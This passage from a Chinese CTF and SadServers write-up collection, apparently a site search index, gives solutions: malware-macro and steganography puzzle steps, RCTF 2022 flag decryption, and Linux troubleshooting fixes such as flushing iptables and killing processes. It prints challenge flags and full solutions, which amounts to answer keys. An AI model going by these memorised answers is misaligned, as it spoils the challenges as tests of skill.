\u503c\u641c\u7d22\u4e86\u4e00\u4e0b\uff0c\u679c\u7136\u5f97\u5230\u4e86\u5206\u6790\uff1ahttps://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919</p> <p>\u91cc\u9762\u5c31\u6709\u8fd9\u4e2a api address\uff1aapi.ipify.org\uff0cmd5 \u540e\u5f97\u5230\u5bc6\u7801 08229f4052dde89671134f1784bed2d6</p> <p>\u89e3\u538b\u540e\u5f97\u5230\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u91cc\u9762\u53ef\u4ee5\u770b\u5230 \"GobThis is a Gob File!Time2022-07-19 14:49:56PNG File\"\uff0c\u662f go \u7684\u5e8f\u5217\u5316\u6587\u4ef6\uff0c\u4f7f\u7528  drosseau/degob \u53cd\u5e8f\u5217\u5316\uff0c\u5f97\u5230 png \u7684\u9010\u5b57\u8282\u503c</p> <p>\u4e0d\u8fc7\u8fd9\u4e9b\u503c\u5199\u5165\u4e8c\u8fdb\u5236\u6587\u4ef6\u540e\u5e76\u4e0d\u80fd\u6253\u5f00\u56fe\u7247\uff0c\u53c8\u5361\u4f4f\u4e86\uff0c\u6709\u4e86\u7b2c\u4e09\u4e2a hint\uff1a\u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u7684\u673a\u5bc6\u6027\uff0c\u4ed6\u628a\u6570\u636e\u968f\u673a\u6253\u4e71\u4e86\u3002\u5f88\u65e0\u8bed\uff0c\u5c31\u7eaf\u7eaf\u7684\u50bb\u903c\u9898\uff0c\u867d\u7136\u8bf4\u6709\u65f6\u95f4\u79cd\u5b50\u7684\u6697\u793a\uff0c\u4f46\u5e76\u4e0d\u5f3a\u70c8\uff0c\u7eaf\u7eaf\u50bb\u903c</p> <p>\u7528 go \u5199\u4e00\u4e2a\u968f\u673a\u6253\u4e71\u7684\u7a0b\u5e8f\uff0c\u6309\u7167\u6253\u4e71\u7684\u903b\u8f91\u53cd\u8fc7\u6765\uff0c\u5c31\u53ef\u4ee5\u6062\u590d png \u56fe\u7247\u3002\u4e0d\u8fc7\u5199\u4ee4\u6211\u53cd\u611f\u7684 go \u4ee3\u7801\u6709\u591f\u70e6\u7684</p> <p>\u56fe\u7247\u6253\u5f00\u4e4b\u540e\u662f flag not here \u6587\u5b57\u3002\u53c8\u662f\u5f88\u65e0\u8bed\uff0c\u5230\u8fd9\u4e86\u8fd8**\u5957\u5a03</p> <p>\u4e22\u5230 stegsolve \u91cc\uff0c\u770b\u4e0d\u51fa\u4ec0\u4e48\u4e1c\u897f\uff0cred green plane \u6709\u5947\u602a\u7684\u952f\u9f7f\u72b6\u3002\u540e\u6765\u53d1\u73b0 alpha \u901a\u9053\u90fd\u662f\u6709\u503c\u7684\uff0c\u53ef\u80fd\u4f1a\u901a\u8fc7 alpha \u901a\u9053\u4f20\u4fe1\u606f\uff08\u4e0d\u8fc7\u8fd9\u65f6\u6bd4\u8d5b\u5df2\u7ecf\u5feb\u7ed3\u675f\u4e86\uff09</p> <p>\u7528 PIL \u63d0\u53d6 alpha \u901a\u9053\u7684\u503c\uff0c\u679c\u7136\u6709\u5f88\u591a\u4e0d\u540c\u503c\uff0c\u4e0d\u8fc7\u5927\u90e8\u5206\u8fd8\u662f 0xff \u548c 0x00\uff0c\u6240\u4ee5\u8003\u8651\u53bb\u6389 0xff \u548c 0x00 \u770b\u4e00\u770b\uff0c\u5c06\u56fe\u7247\u5c55\u5f00\u6210\u4e00\u7ef4\uff0c\u7136\u540e\u5254\u9664 ff \u548c 00 \u5f97\u5230\u5b57\u8282\u5f62\u5f0f\u7684\u4e00\u5806 flag\uff1a <pre><code>img = Image.open(\"flag.png\")\narr = np.array(img)\nwidth, height = img.size\nbytes(arr[:,:,3].reshape(width*height)).replace(b\"\\xff\", b\"\").replace(b\"\\x00\", b\"\")\n# b'flag{898161df-fabf-4757-82b6-ffe407c69475}flag{898161df-f...\n</code></pre> \u6700\u7ec8 flag: flag{898161df-fabf-4757-82b6-ffe407c69475}</p> <p>\u7ec6\u6570\u4e00\u4e0b\u8fd9\u9898\u6709\u51e0\u5c42\uff1a</p> <ol> <li>\u89e3\u7801 vmess \u6d41\u91cf</li> <li>\u627e\u5230 doc \u4e2d\u7684\u5b8f</li> <li>\u901a\u8fc7\u5206\u6790\u5b8f\u627e\u5230\u75c5\u6bd2\u8c03\u7528\u7684 api \u5730\u5740</li> <li>\u89e3\u7801 gob \u6587\u4ef6</li> <li>\u901a\u8fc7\u65f6\u95f4\u968f\u673a\u79cd\u5b50\u6062\u590d\u4e71\u5e8f\u7684 png \u6587\u4ef6</li> <li>png alpha \u901a\u9053\u9690\u5199</li> </ol> <p>\u5f88\u591a\u6b65\u9aa4\u6ca1\u6709\u5145\u8db3\u7684\u63d0\u793a\uff0c\u800c\u4e14\u5f88\u591a\u662f\u7eaf\u7eaf\u6ca1\u5fc5\u8981\u7684\u786c\u5957\u3002\u6ca1\u6709\u96be\u9898\u53ef\u4ee5\u4e0d\u51fa\uff0c\u4e0d\u8981\u7528\u8fd9\u79cd\u9898\u6076\u5fc3\u9009\u624b\u2026\u2026</p>"}, {"location": "writeups/rctf2022/", "title": "RCTF 2022 Writeup", "text": "<p> \u7ea6 421 \u4e2a\u5b57  29 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u540e\u8865\u7684 writeup\u3002\u9898\u8fd8\u633a\u6709\u610f\u601d\uff0c\u505a\u4e86\u4e24\u9053 misc\uff0c\u8fd8\u6709\u4e00\u9053\u504f web\u3001\u4e00\u9053 AI \u7684\u88ab\u961f\u53cb\u76f4\u63a5\u6740\u4e86\uff0c\u5c31\u6ca1\u518d\u770b\u3002</p>"}, {"location": "writeups/rctf2022/#k999", "title": "K999", "text": "<p>\u4e00\u4e2a\u6e38\u620f\uff0c\u624b\u6253\u57fa\u672c\u6253\u4e0d\u52a8\uff0c\u9006\u5411/\u770b exe \u53ef\u4ee5\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a\u7528 lua love \u5f15\u64ce\u5199\u7684\u6e38\u620f\u3002\u5176 lua \u6e90\u7801\u4f1a\u76f4\u63a5\u4ee5 zip \u7684\u5f62\u5f0f\u9644\u52a0\u5728 exe \u672b\u5c3e\uff0c\u6240\u4ee5\u63d0\u53d6\u51fa\u6765\u89e3\u538b\u5373\u53ef\u5f97\u5230\u6e38\u620f\u6e90\u7801\u3002</p> <p>\u53ef\u4ee5\u5f88\u660e\u663e\u7684\u53d1\u73b0\u6709\u4e00\u4e2a flag.lua \u7684\u6587\u4ef6\uff0c\u91cc\u9762\u6709\u4e00\u4e9b\u89e3\u5bc6\u76f8\u5173\u4ee3\u7801\uff0c\u5728 main.lua \u91cc\u9762\u53ef\u4ee5\u770b\u5230\u80dc\u5229\u4e4b\u540e\u6709\u8f93\u51fa\u7684\u4ee3\u7801\uff1a</p> <pre><code>if world.KillenemyCount &gt;= 999 then\n    love.graphics.push('all')\n    love.graphics.setColor(255, 255, 0, 255)\n    local flag1 = \"MOON\\r\\n\"\n    local flag2 = \"157 89 215 46 13 189 237 23 241\\r\\n\"\n    local flag3 = \"49 84 146 248 150 138 183 119 52\\r\\n\"\n    local flag4 = \"34 174 146 132 225 192 5 220 221\\r\\n\"\n    local flag5 = \"176 184 218 19 87 249 122\\r\\n\"\n    local flag6 = \"Find a Decrypt!\\r\\n\"\n    love.graphics.print(flag1, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2, 0, 2, 2, 37, 7)\n    love.graphics.print(flag2, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2 + 20, 0, 2, 2, 37, 7)\n    love.graphics.print(flag3, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2 + 40, 0, 2, 2, 37, 7)\n    love.graphics.print(flag4, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2 + 60, 0, 2, 2, 37, 7)\n    love.graphics.print(flag5, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2 + 80, 0, 2, 2, 37, 7)\n    love.graphics.print(flag6, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2 + 100, 0, 2, 2, 37, 7)\n    love.graphics.pop()\n    getflag = true\n</code></pre> <p>\u6240\u4ee5\u628a\u6570\u636e\u62ff\u51fa\u6765\uff0cMOON \u662f key\uff0c\u5269\u4e0b\u7684\u662f s\uff0c\u987a\u7740 flag.lua \u91cc\u7684\u610f\u601d\u76f4\u63a5\u63a5\u4e00\u4e2a\u89e3\u5bc6\u51fd\u6570\u7136\u540e\u76f4\u63a5\u8fd0\u884c\u5373\u53ef\uff1a</p> <pre><code>function Decrypt()\n    local key = \"MOON\"\n    local s = {157, 89, 215, 46, 13, 189, 237, 23, 241, 49, 84, 146, 248, 150, 138, 183, 119, 52, 34, 174, 146, 132, 225, 192, 5, 220, 221, 176, 184, 218, 19, 87, 249, 122}\n    flag = \"\"\n    for i = 1, #s, 1 do\n        flag = flag .. string.char(s[i])\n    end\n    flag = strDecrypt(flag, key)\n    print(flag)\nend\n\nDecrypt()\n</code></pre> <p>\u5f97\u5230 flag: RCTF{1_Rea11y_Want_t0_Y0ur_H0use}</p>"}, {"location": "writeups/rctf2022/#ez_alient", "title": "ez_alient", "text": "<p>\u770b\u8d77\u6765\u662f\u7ecf\u5178\u7684 python \u5916\u661f\u4eba\u6253\u98de\u673a\u6e38\u620f\uff0c\u6709\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u5939\uff0c\u53ef\u4ee5\u53d1\u73b0 alien.bmp \u672b\u5c3e\u6709 pwd=\"N0bOdy_l0ves_Me\"\uff0c\u662f\u538b\u7f29\u5305\u5bc6\u7801\u3002</p> <p>\u89e3\u538b\u540e\u662f python \u6253\u5305\u597d\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u7528 pyinstxtractor+uncompyle6 \u53ef\u4ee5\u89e3\u51fa\u6e90\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0 alien_invasion.py \u91cc\u9762\u5b58\u5728\u4e00\u4e2a\u6ca1\u7528\u7684\u53d8\u91cf s=\"VTJreE0yNWpNdz09\"\uff0c\u4e8c\u6b21 base64 \u89e3\u7801\u53ef\u4ee5\u5f97\u5230 \"Si13nc3\"\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\u8fd8\u6709 PYZ-00.pyz \u6587\u4ef6\uff0c\u540c\u6837\u89e3\u5305\u5e76\u53cd\u7f16\u8bd1\u53ef\u4ee5\u5f97\u5230\u5176\u4ed6\u90e8\u5206\u6e90\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u66f4\u591a\u6ca1\u7528\u7684\u53d8\u91cf\uff1a</p> <ul> <li>alien.py: a = <code>TVRVPQ==</code> -&gt; <code>MTU=</code> -&gt; 15</li> <li>bullet.py: a = <code>YmtWMlJYST0=</code> -&gt; <code>bkV2RXI=</code> -&gt; nEvEr</li> <li>button.py: k = <code>T1dsMmFXNDU=</code> -&gt; <code>OWl2aW45</code> -&gt; 9ivin9</li> <li>game_stats.py: t = <code>ZFhBPQ==</code> -&gt; <code>dXA=</code> -&gt; up</li> <li>scoreboard.py: m = <code>SmlZPQ==</code> -&gt; <code>JiY=</code> -&gt; &amp;&amp;</li> <li>settings.py: l = <code>Tm5WMA==</code> -&gt; <code>NnV0</code> -&gt; 6ut</li> <li>ship.py: m = <code>YURBeFpHbHVPUT09 VDI0PQ== VTJreE0yNVVNWGs9</code><ul> <li><code>YURBeFpHbHVPUT09</code> -&gt; <code>aDAxZGluOQ==</code> -&gt; h01din9</li> <li><code>VDI0PQ==</code> -&gt; <code>T24=</code> -&gt; On</li> <li><code>VTJreE0yNVVNWGs9</code> -&gt; <code>U2kxM25UMXk=</code> -&gt; Si13nT1y</li> </ul> </li> </ul> <p>\u62fc\u8d77\u6765\u5c31\u662f flag: RCTF{Si13nc3_15_nEvEr_9ivin9_up_&amp;&amp;_6ut_h01din9_On_Si13nT1y}</p> <p>\u53cd\u6b63\u5c31\u662f\u611f\u89c9\u786c\u85cf\u6ca1\u5565\u610f\u601d\uff0c\u800c\u4e14\u5355\u8bcd\u987a\u5e8f\u5176\u5b9e\u8fd8\u5e76\u4e0d\u786e\u5b9a\uff0c\u786c\u731c\u3002</p>"}, {"location": "writeups/sadservers/", "title": "SadServers Writeup", "text": "<p> \u7ea6 3871 \u4e2a\u5b57  719 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 22 \u5206\u949f</p> <p>Abstract</p> <p>\u6c34 tg \u53d1\u73b0\u7684\uff0c\u633a\u597d\u73a9\u7684\uff0c\u5c31\u505a\u4e00\u505a\uff0c\u5b66\u5230\u5f88\u591a\uff0c\u5c31\u5199\u4e00\u5199\u3002</p> <p>\u5e73\u53f0\u5730\u5740\u5728 https://sadservers.com/ \u3002\u5927\u6982\u7c7b\u4f3c\u8fd0\u7ef4\uff1f\u53cd\u6b63\u5927\u6982\u5c31\u662f\u4fee\u590d\u4e00\u4e9b Linux \u670d\u52a1\u5668\u51fa\u73b0\u7684\u95ee\u9898\u3002</p> <p>\u4e0d\u7b97 CTF\uff0c\u4e0d\u77e5\u9053\u548b\u5206\u7c7b\uff0c\u5c31\u6254\u8fd9\u91cc\u5427</p> <p>\u770b\u8d77\u6765\u9898\u76ee\u4e0d\u591a\uff0c\u636e\u8bf4\u662f \"new challenges weekly\"\uff0c\u51fa\u7684\u8bdd\u6216\u8bb8\u53ef\u4ee5\u968f\u65f6\u66f4\u65b0\uff1f\uff08\u5495\u5495\u5495</p>"}, {"location": "writeups/sadservers/#saint-john", "title": "\"Saint John\"", "text": "<p>Scenario: \"Saint John\": what is writing to this log file?</p> <p>Level: Easy</p> <p>Description: A developer created a testing program that is continuously writing to a log file /var/log/bad.log and filling up disk. You can check for example with <code>tail -f /var/log/bad.log</code>. This program is no longer needed. Find it and terminate it.</p> <p>OS: Ubuntu 22.04 LTS</p> <p>\u53ef\u4ee5 tail -f /var/log/bad.log \u770b\u4e00\u773c\u786e\u5b9e\u5728\u4e00\u76f4\u586b\u4e1c\u897f\u3002\u7136\u540e\u5f53\u7136\u662f\u5148\u67e5\u4e00\u4e0b\u540e\u53f0\u8fdb\u7a0b ps -aux\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u6761\u5f88\u53ef\u7591\uff1a <pre><code>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n...\nubuntu       610  0.0  1.7  17672  8212 ?        S    07:57   0:00 /usr/bin/python3 /home/ubuntu/badlog.py\n...\n</code></pre> \u53ef\u4ee5 cat \u770b\u4e00\u4e0b badlog.py: <pre><code>#! /usr/bin/python3\n# test python writing to a file\n\nimport random\nimport time\nfrom datetime import datetime\n\nf = open('/var/log/bad.log', 'a')\nwhile True:\n  r = random.randrange(2147483647)\n  f.write(str(datetime.now()) + ' token: ' + str(r) + '\\n')\n  f.flush()\n  time.sleep(1)\n</code></pre> \u786e\u5b9e\u662f\u5728\u6bcf\u4e00\u79d2\u5199\u4e00\u884c\u3002\u6240\u4ee5\u76f4\u63a5 kill -9 610 \u5f3a\u5236\u6740\u6b7b\u8fd9\u4e2a\u8fdb\u7a0b\u5c31\u597d\u4e86\u3002</p> <p>\u9898\u76ee\u7684\u672c\u610f\u5927\u6982\u662f\u7528 lsof \u6765\u67e5\u770b\u4f7f\u7528\u67d0\u4e00\u6587\u4ef6\u7684\u8fdb\u7a0b\uff1a <pre><code>ubuntu@ip-172-31-32-108:/$ lsof /var/log/bad.log \nCOMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF  NODE NAME\nbadlog.py 610 ubuntu    3w   REG  259,1    31275 67701 /var/log/bad.log\n</code></pre></p> <p>\u7136\u540e\u540c\u6837\u662f\u5f3a\u6740\u3002</p>"}, {"location": "writeups/sadservers/#saskatoon", "title": "\"Saskatoon\"", "text": "<p>Scenario: \"Saskatoon\": counting IPs.</p> <p>Level: Easy</p> <p>Description: There's a web server access log file at /home/admin/access.log. The file consists of one line per HTTP request, with the requester's IP address at the beginning of each line.</p> <p>Find what's the IP address that has the most requests in this file (there's no tie; the IP is unique). Write the solution into a file /home/admin/highestip.txt. For example, if your solution is \"1.2.3.4\", you can do echo \"1.2.3.4\" &gt; /home/admin/highestip.txt</p> <p>OS: Debian 11</p> <p>\u6240\u6709\u9700\u8981\u7684\u4e1c\u897f\u90fd\u5728 access.log \u91cc\u9762\uff0c\u6240\u4ee5\u5199\u4e00\u4e2a python \u811a\u672c\u8bfb\u53d6\u3001\u7edf\u8ba1\u3001\u6392\u5e8f\u3001\u8f93\u51fa\u5c31\u597d\u4e86\uff1a <pre><code>with open(\"/home/admin/access.log\", \"r\") as f:\n    contents = f.readlines()\n\nips = [line.split(\" \")[0] for line in contents]\ncnt = list(set([(ips.count(ip), ip) for ip in ips]))\nprint(sorted(cnt)[-1])\n# (482, '66.249.73.135')\n</code></pre> \u6240\u4ee5\u8bf7\u6c42\u6700\u591a\u7684 ip \u5c31\u662f 66.249.73.135\u3002</p> <p>\u5f53\u7136\u9898\u76ee\u7684\u610f\u601d\u662f\u901a\u8fc7 shell \u547d\u4ee4\u76f4\u63a5\u6765\u505a\u3002\u53ef\u4ee5 cat \u7136\u540e cut \u6765\u53d6\u51fa ip\uff0c\u7136\u540e sort | uniq -c \u6765\u7edf\u8ba1\u6b21\u6570\uff08\u8981\u5148 sort\uff0cuniq \u53ea\u4f1a\u7edf\u8ba1\u76f8\u90bb\u7684\u91cd\u590d\u884c\uff09\uff0c\u4e4b\u540e\u5728 sort \u4e00\u4e0b\uff0c\u6700\u540e\u4e00\u884c\u5c31\u662f\u8981\u7684\u4e86\uff1a <pre><code>$ cat /home/admin/access.log | cut -d ' ' -f 1 | sort | uniq -c | sort | tail -n 1\n    482 66.249.73.135\n</code></pre> \u7528 awk \u6765\u5904\u7406\u4e5f\u5f88\u65b9\u4fbf\uff0c\u76f4\u63a5\u4e00\u884c\u89e3\u51b3\uff1a <pre><code>$ awk '{print $1}' /home/admin/access.log | sort | uniq -c | sort | tail -n 1 | awk '{print $2}' &gt; /home/admin/highestip.txt\n</code></pre></p>"}, {"location": "writeups/sadservers/#tokyo", "title": "\"Tokyo\"", "text": "<p>Scenario: \"Tokyo\": can't serve web file</p> <p>Level: Medium</p> <p>Description: There's a web server serving a file /var/www/html/index.html with content \"hello sadserver\" but when we try to check it locally with an HTTP client like curl 127.0.0.1:80, nothing is returned. This scenario is not about the particular web server configuration and you only need to have general knowledge about how web servers work.</p> <p>OS: Ubuntu 22.04 LTS</p> <p>ps -aux \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a web server \u670d\u52a1\u662f\u7531 apache2 \u63d0\u4f9b\u7684\uff1a <pre><code>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n...\nwww-data     774  0.0  0.9 1211728 4304 ?        Sl   08:27   0:00 /usr/sbin/apache2 -k start\nwww-data     775  0.0  0.9 1211728 4304 ?        Sl   08:27   0:00 /usr/sbin/apache2 -k start\n...\n</code></pre> \u53bb /etc/apache2 \u901b\u4e86\u4e00\u5708\uff0c\u786e\u5b9e\u6ca1\u4ec0\u4e48\u95ee\u9898\u3002</p> <p><code>curl -v 127.0.0.1:80</code>\uff0c\u53d1\u73b0\u6839\u672c\u5c31\u8fde\u4e0d\u4e0a\u3002\u53ef\u80fd\u662f\u9632\u706b\u5899\u7684\u95ee\u9898\uff0c\u770b\u4e00\u4e0b iptables\uff1a <pre><code># iptables -L -n\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nDROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:80\n\nChain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination\n</code></pre> \u53d1\u73b0 INPUT \u94fe\u628a\u6240\u6709 tcp \u5305\u90fd DROP \u4e86\u3002\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u60c5\u51b5\u89c4\u5219\uff1a <pre><code># iptables -F\n</code></pre> \u7136\u540e\u518d curl \u53d1\u73b0\u8fd4\u56de 403 Forbidden\u3002\u68c0\u67e5\u4e00\u4e0b /var/www/html/index.html \u7684\u6743\u9650\uff1a <pre><code># ls -l /var/www/html/index.html\n-rw------- 1 root root 16 Aug  1 00:40 /var/www/html/index.html\n</code></pre> \u6240\u4ee5\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u6743\u9650\uff0c\u8ba9\u6240\u6709\u4eba\u53ef\u8bfb\uff1a <pre><code># chmod +r /var/www/html/index.html\n</code></pre> \u7136\u540e\u518d curl \u5c31\u53ef\u4ee5\u4e86\u3002</p>"}, {"location": "writeups/sadservers/#manhattan", "title": "\"Manhattan\"", "text": "<p>Scenario: \"Manhattan\": can't write data into database.</p> <p>Level: Medium</p> <p>Description: Your objective is to be able to insert a row in an existing Postgres database. The issue is not specific to Postgres and you don't need to know details about it (although it may help).</p> <p>Helpful Postgres information: it's a service that listens to a port (:5432) and writes to disk in a data directory, the location of which is defined in the data_directory parameter of the configuration file /etc/postgresql/14/main/postgresql.conf. In our case Postgres is managed by systemd as a unit with name postgresql.</p> <p>OS: Debian 10</p> <p>\u6709\u4e00\u4e9b\u96be\u5ea6\uff0c\u770b\u4e86\u4e9b\u63d0\u793a\u3002</p> <p>\u9996\u5148 <code>systemctl status postgresql</code> \u53ef\u4ee5\u770b\u51fa postgresql \u786e\u5b9e\u5728\u8fd0\u884c\uff0c\u4f46\u662f\u8fde\u4e0d\u4e0a\u3002\u770b\u4e00\u770b /var/log/syslog \u6ca1\u6709\u4ec0\u4e48\u5f02\u6837\u3002</p> <p>\u8bd5\u7740 <code>systemctl restart postgresql</code> \u91cd\u542f postgresql\uff0c\u6ca1\u6709\u62a5\u9519\uff0c\u4f46\u662f /var/log/syslog \u91cc\u9762\u53ef\u4ee5\u770b\u5230\u9519\u8bef\uff1a <pre><code>Nov  3 09:11:58 ip-172-31-47-134 postgresql@14-main[884]: 2022-11-03 09:11:58.882 UTC [889] FATAL:  could not create lock file \"postmaster.pid\": No space left on device\n</code></pre> No space left on device\uff0c\u6240\u4ee5 df \u770b\u4e00\u4e0b\u78c1\u76d8\u7528\u91cf\uff1a <pre><code>root@ip-172-31-47-134:/# df\nFilesystem      1K-blocks    Used Available Use% Mounted on\nudev               229200       0    229200   0% /dev\ntmpfs               47660    1520     46140   4% /run\n/dev/nvme1n1p1    8026128 1233676   6363196  17% /\ntmpfs              238300       0    238300   0% /dev/shm\ntmpfs                5120       0      5120   0% /run/lock\ntmpfs              238300       0    238300   0% /sys/fs/cgroup\n/dev/nvme1n1p15    126710     278    126432   1% /boot/efi\n/dev/nvme0n1      8378368 8378340        28 100% /opt/pgdata\n</code></pre> \u53ef\u4ee5\u770b\u5230\u6302\u8f7d\u5728 /opt/pgdata \u4e0a\u7684\u8bbe\u5907\u5bb9\u91cf\u6ee1\u4e86\u3002\u68c0\u67e5\u4e00\u4e0b\u8fd9\u4e2a\u76ee\u5f55\uff1a <pre><code>root@ip-172-31-47-134:/# ls -l /opt/pgdata\ntotal 8285620\n-rw-r--r--  1 root     root             69 May 21 22:20 deleteme\n-rw-r--r--  1 root     root     7516192768 May 21 22:06 file1.bk\n-rw-r--r--  1 root     root      967774208 May 21 22:17 file2.bk\n-rw-r--r--  1 root     root         499712 May 21 22:23 file3.bk\ndrwx------ 19 postgres postgres       4096 May 21 22:24 main\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u4e00\u5806 .bk \u5907\u4efd\u6587\u4ef6\u5360\u6ee1\u4e86\u78c1\u76d8\uff0c\u5220\u9664\u3001\u91cd\u542f\u3001\u6d4b\u8bd5\uff0c\u53d1\u73b0\u4e00\u5207\u6b63\u5e38\u4e86\uff1a <pre><code>root@ip-172-31-47-134:/# rm /opt/pgdata/file*.bk\nroot@ip-172-31-47-134:/# ls -l /opt/pgdata\ntotal 8\n-rw-r--r--  1 root     root       69 May 21 22:20 deleteme\ndrwx------ 19 postgres postgres 4096 May 21 22:24 main\nroot@ip-172-31-47-134:/# systemctl restart postgresql\nroot@ip-172-31-47-134:/# sudo -u postgres psql -c \"insert into persons(name) values ('jane smith');\" -d dt\nINSERT 0 1\n</code></pre></p>"}, {"location": "writeups/sadservers/#cape-town", "title": "\"Cape Town\"", "text": "<p>Scenario: \"Cape Town\": Borked Nginx</p> <p>Level: Medium</p> <p>Description: There's an Nginx web server installed and managed by systemd. Running curl -I 127.0.0.1:80 returns curl: (7) Failed to connect to localhost port 80: Connection refused , fix it so when you curl you get the default Nginx page.</p> <p>OS: Debian 11</p> <p>\u9996\u5148 systemctl status nginx \u68c0\u67e5\u4e00\u4e0b nginx \u8fd0\u884c\u72b6\u6001\uff1a <pre><code>$ sudo systemctl status nginx\n\u25cf nginx.service - The NGINX HTTP and reverse proxy server\n     Loaded: loaded (/etc/systemd/system/nginx.service; enabled; vendor preset: enabled)\n     Active: failed (Result: exit-code) since Thu 2022-11-03 09:30:47 UTC; 42s ago\n    Process: 584 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=1/FAILURE)\n        CPU: 28ms\n\nNov 03 09:30:47 ip-172-31-33-45 systemd[1]: Starting The NGINX HTTP and reverse proxy server...\nNov 03 09:30:47 ip-172-31-33-45 nginx[584]: nginx: [emerg] unexpected \";\" in /etc/nginx/sites-enabled/default:1\nNov 03 09:30:47 ip-172-31-33-45 nginx[584]: nginx: configuration file /etc/nginx/nginx.conf test failed\nNov 03 09:30:47 ip-172-31-33-45 systemd[1]: nginx.service: Control process exited, code=exited, status=1/FAILURE\nNov 03 09:30:47 ip-172-31-33-45 systemd[1]: nginx.service: Failed with result 'exit-code'.\nNov 03 09:30:47 ip-172-31-33-45 systemd[1]: Failed to start The NGINX HTTP and reverse proxy server.\n</code></pre> \u53d1\u73b0\u6709\u62a5\u9519\uff0c\u8bf4\u5728 /etc/nginx/sites-enabled/default:1 \u6709\u4e00\u4e2a unexpected \";\"\uff0c\u6240\u4ee5\u53bb\u5220\u6389\u5b83\uff0c\u7136\u540e\u91cd\u542f\u3002 <pre><code>admin@ip-172-31-33-45:/$ sudo vim /etc/nginx/sites-enabled/default \nadmin@ip-172-31-33-45:/$ sudo systemctl restart nginx\nadmin@ip-172-31-33-45:/$ sudo systemctl status nginx\n\u25cf nginx.service - The NGINX HTTP and reverse proxy server\n     Loaded: loaded (/etc/systemd/system/nginx.service; enabled; vendor preset: enabled)\n     Active: active (running) since Thu 2022-11-03 09:32:32 UTC; 6s ago\n    Process: 868 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=0/SUCCESS)\n    Process: 869 ExecStart=/usr/sbin/nginx (code=exited, status=0/SUCCESS)\n   Main PID: 870 (nginx)\n      Tasks: 2 (limit: 524)\n     Memory: 2.4M\n        CPU: 27ms\n     CGroup: /system.slice/nginx.service\n             \u251c\u2500870 nginx: master process /usr/sbin/nginx\n             \u2514\u2500871 nginx: worker process\n\nNov 03 09:32:32 ip-172-31-33-45 systemd[1]: Starting The NGINX HTTP and reverse proxy server...\nNov 03 09:32:32 ip-172-31-33-45 nginx[868]: nginx: the configuration file /etc/nginx/nginx.conf syntax is ok\nNov 03 09:32:32 ip-172-31-33-45 nginx[868]: nginx: configuration file /etc/nginx/nginx.conf test is successful\nNov 03 09:32:32 ip-172-31-33-45 systemd[1]: Started The NGINX HTTP and reverse proxy server.\n</code></pre> \u5de5\u4f5c\u6b63\u5e38\uff0c\u4f46\u662f curl \u4e00\u4e0b\u4f1a\u5f97\u5230 500\u3002\u68c0\u67e5\u4e00\u4e0b log\uff1a <pre><code>admin@ip-172-31-33-45:/$ cat /var/log/nginx/error.log | tail -n 10\n2022/09/11 16:39:11 [emerg] 5875#5875: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/09/11 16:54:26 [emerg] 5931#5931: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/09/11 16:55:00 [emerg] 5961#5961: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/09/11 17:02:07 [emerg] 6066#6066: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/09/11 17:07:03 [emerg] 6146#6146: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/11/03 09:30:47 [emerg] 584#584: unexpected \";\" in /etc/nginx/sites-enabled/default:1\n2022/11/03 09:32:32 [alert] 870#870: socketpair() failed while spawning \"worker process\" (24: Too many open files)\n2022/11/03 09:32:32 [emerg] 871#871: eventfd() failed (24: Too many open files)\n2022/11/03 09:32:32 [alert] 871#871: socketpair() failed (24: Too many open files)\n2022/11/03 09:33:03 [crit] 871#871: *1 open() \"/var/www/html/index.nginx-debian.html\" failed (24: Too many open files), client: 127.0.0.1, server: _, request: \"GET / HTTP/1.1\", host: \"127.0.0.1\"\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u62a5\u9519 Too many open files\u3002\u641c\u4e86\u4e00\u4e0b\uff0c\u7f51\u4e0a\u63d0\u4f9b\u7684\u65b9\u6cd5\u90fd\u8bd5\u4e86\u4e00\u5708\uff0c\u95ee\u9898\u4e0d\u51fa\u5728 nginx \u7684\u914d\u7f6e\u4e0a\u3002\u7136\u540e\u6839\u636e\u63d0\u793a\u53bb\u770b\u4e86 systemd \u4e0a nginx \u7684\u914d\u7f6e\uff1a <pre><code>admin@ip-172-31-33-45:/$ cat /etc/systemd/system/nginx.service \n[Unit]\nDescription=The NGINX HTTP and reverse proxy server\nAfter=syslog.target network-online.target remote-fs.target 